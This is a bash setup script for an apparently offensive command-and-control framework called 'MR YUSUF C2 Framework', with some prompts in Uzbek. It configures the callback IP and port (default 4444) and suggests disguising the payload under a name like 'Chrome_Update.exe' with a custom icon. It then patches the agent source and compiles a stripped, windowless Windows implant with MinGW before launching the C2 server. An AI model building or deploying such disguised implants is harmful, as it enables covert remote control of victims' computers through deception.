#!/bin/bash

# Ensure we are in the script's directory
cd "$(dirname "$0")"

# ==========================================
# MR YUSUF C2 Framework
# Universal Setup & Configuration Script
# ==========================================

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

clear
echo -e "${RED}"
echo " ███▄ ▄███▓ ██▀███       ▓██   ██▓ █    ██   ██████  █    ██   █████▒"
echo "▓██▒▀█▀ ██▒▓██ ▒ ██▒      ▒██  ██▒ ██  ▓██▒▒██    ▒  ██  ▓██▒▓██   ▒ "
echo "▓██    ▓██░▓██ ░▄█ ▒       ▒██ ██░▓██  ▒██░░ ▓██▄   ▓██  ▒██░▒████ ░ "
echo "▒██    ▒██ ▒██▀▀█▄         ░ ▐██▓░▓▓█  ░██░  ▒   ██▒▓▓█  ░██░░▓█▒  ░ "
echo "▒██▒   ░██▒░██▓ ▒██▒ ██▓   ░ ██▒▓░▒▒█████▓ ▒██████▒▒▒▒█████▓ ░▒█░    "
echo "░ ▒░   ░  ░░ ▒▓ ░▒▓░ ▒▓▒    ██▒▒▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒ ░    "
echo "░  ░      ░  ░▒ ░ ▒░ ░▒   ▓██ ░▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░░░▒░ ░ ░  ░      "
echo "░      ░     ░░   ░  ░    ▒ ▒ ░░   ░░░ ░ ░ ░  ░  ░   ░░░ ░ ░  ░ ░    "
echo "       ░      ░       ░   ░ ░        ░           ░     ░               "
echo "                      ░   ░ ░                                           "
echo -e "${CYAN}    [+] Developer: MR YUSUF${NC}"
echo -e "${CYAN}    [+] Version:   2.5 [ULTIMATE CYBER EDITION]${NC}"
echo ""

# ------------------------------------------
# 1. Check Dependencies
# ------------------------------------------
echo -e "${BLUE}[1/4] Checking System Dependencies...${NC}"

# Check Python3
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}[!] python3 is not installed.${NC}"
    exit 1
fi

# Check PIP
if ! command -v pip &> /dev/null; then
    echo -e "${RED}[!] pip is not installed. Installing...${NC}"
    sudo apt-get update &> /dev/null
    sudo apt-get install -y python3-pip &> /dev/null
fi

# Install Python Requirements
echo -e "   [*] Installing Python libraries..."
pip install flask flask-socketio eventlet &> /dev/null

# Check MinGW
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null || ! command -v i686-w64-mingw32-g++ &> /dev/null; then
    echo -e "${RED}[!] MinGW compiler (x64 or x86) not found.${NC}"
    echo -e "   [*] Installing complete MinGW-w64 toolchain..."
    sudo apt-get update &> /dev/null
    sudo apt-get install -y mingw-w64 &> /dev/null
else
    echo -e "${GREEN}   [+] MinGW compilers detected (x64 & x86).${NC}"
fi

# ------------------------------------------
# 2. Configuration
# ------------------------------------------
echo -e "\n${BLUE}[2/4] Configuration${NC}"

# Get Local IP
DEFAULT_IP=$(hostname -I | cut -d' ' -f1)
[ -z "$DEFAULT_IP" ] && DEFAULT_IP="127.0.0.1"

while true; do
    read -p "   [?] C2 Server IP Address (Your IP) [$DEFAULT_IP]: " C2_IP_INPUT
    if [ -z "$C2_IP_INPUT" ]; then
        C2_IP=$DEFAULT_IP
    else
        C2_IP=$C2_IP_INPUT
    fi

    if [ -z "$C2_IP" ]; then
         echo -e "${RED}   [!] Iltimos, server IP manzilini kiriting!${NC}"
    else
         break
    fi
done

while true; do
    read -p "   [?] Agent Connection Port [4444]: " C2_PORT_INPUT
    if [ -z "$C2_PORT_INPUT" ]; then
        C2_PORT=4444
    else
        C2_PORT=$C2_PORT_INPUT
    fi
    
    if [ -z "$C2_PORT" ]; then
        echo -e "${RED}   [!] Iltimos, portni kiriting!${NC}"
    else
        break
    fi
done

while true; do
    read -p "   [?] Web Interface Port [2727]: " WEB_PORT_INPUT
    if [ -z "$WEB_PORT_INPUT" ]; then
        WEB_PORT=2727
    else
        WEB_PORT=$WEB_PORT_INPUT
    fi

    if [ -z "$WEB_PORT" ]; then
         echo -e "${RED}   [!] Iltimos, web portni kiriting!${NC}"
    else
         break
    fi
done

# Get Payload Name
read -p "   [?] Payload fayl nomi (masalan: Chrome_Update.exe): " PAYLOAD_INPUT
if [ -z "$PAYLOAD_INPUT" ]; then
    PAYLOAD_NAME="Agent.exe"
else
    PAYLOAD_NAME="$PAYLOAD_INPUT"
fi

# Ensure .exe extension for Windows file type
if [[ ! "$PAYLOAD_NAME" == *.exe ]]; then
    PAYLOAD_NAME="${PAYLOAD_NAME}.exe"
fi

# Get Icon Path
echo -e "   [?] Ikonka (.ico) fayl manzili yoki havolasi (link):"
read -p "       > " ICON_PATH

# Handle link if provided
if [[ "$ICON_PATH" == http* ]]; then
    echo -e "   [*] Ikonka havoladan yuklab olinmoqda..."
    curl -s -L -o "temp_icon.ico" "$ICON_PATH"
    if [ $? -eq 0 ] && [ -s "temp_icon.ico" ]; then
        ICON_PATH="temp_icon.ico"
    else
        echo -e "${RED}   [!] Ikonkani yuklab bo'lmadi.${NC}"
        ICON_PATH=""
    fi
fi

echo -e "   [*] Applying configuration..."

# Patch C++ Agent (src/main.cpp)
sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$C2_IP\"/" src/main.cpp
sed -i "s/#define C2_PORT .*/#define C2_PORT $C2_PORT/" src/main.cpp

# Patch Python Server (c2_server.py)
sed -i "s/LPORT = [0-9]*/LPORT = $C2_PORT/" c2_server.py
sed -i "s/LPORT_WEB = [0-9]*/LPORT_WEB = $WEB_PORT/" c2_server.py

# ------------------------------------------
# 3. Compilation
# ------------------------------------------
echo -e "\n${BLUE}[3/4] Building Agent payload...${NC}"

RESOURCE_OBJ=""

# Handle Icon if provided
if [ -n "$ICON_PATH" ]; then
    if [ -f "$ICON_PATH" ]; then
        echo -e "   [*] Adding icon: $ICON_PATH"
        echo "MAINICON ICON \"$ICON_PATH\"" > resource.rc
        
        # Compile resource for x32 (Universal)
        if i686-w64-mingw32-windres resource.rc -O coff -o resource.res 2>/dev/null; then
            RESOURCE_OBJ="resource.res"
        else
            echo -e "${RED}   [!] Ikonka fayli xato (not a valid .ico file).${NC}"
            echo -e "${YELLOW}   [!] Ikonkasiz davom etamiz...${NC}"
        fi
    fi
fi

echo -e "   [*] Compiling Universal (x86/x64) Windows Payload: $PAYLOAD_NAME"
# We use i686-w64-mingw32-g++ because it creates a 32-bit binary that runs on BOTH 32 and 64 bit Windows.
i686-w64-mingw32-g++ -O3 -s -static -mwindows src/main.cpp $RESOURCE_OBJ -o "$PAYLOAD_NAME" -lws2_32 -lwininet -ladvapi32 -lshell32 -liphlpapi

# Cleanup temporary files
rm -f resource.rc resource.res temp_icon.ico

if [ -f "$PAYLOAD_NAME" ]; then
    echo -e "${GREEN}   [+] Payload Generated: $(pwd)/$PAYLOAD_NAME${NC}"
else
    echo -e "${RED}[!] Compilation Failed. Iltimos, src/main.cpp ni tekshiring.${NC}"
    exit 1
fi

# ------------------------------------------
# 4. Finalization
# ------------------------------------------
echo -e "\n${GREEN}[4/4] Setup Complete!${NC}"
echo -e "=================================================="
echo -e "   ${YELLOW}Web C2 Panel:${NC}   http://localhost:$WEB_PORT"
echo -e "   ${YELLOW}Payload:${NC}        $PAYLOAD_NAME"
echo -e "=================================================="

echo -e "\n${CYAN}Start C2 Server? (y/n)${NC}"
read -r START_NOW

if [[ "$START_NOW" =~ ^[Yy]$ ]]; then
    echo -e "\n[*] Cleaning up old processes..."
    fuser -k $WEB_PORT/tcp &> /dev/null
    fuser -k $C2_PORT/tcp &> /dev/null
    sleep 1
    echo -e "[*] Starting Server..."
    python3 c2_server.py
else
    echo -e "\n[*] Run 'python3 c2_server.py' to start later."
fi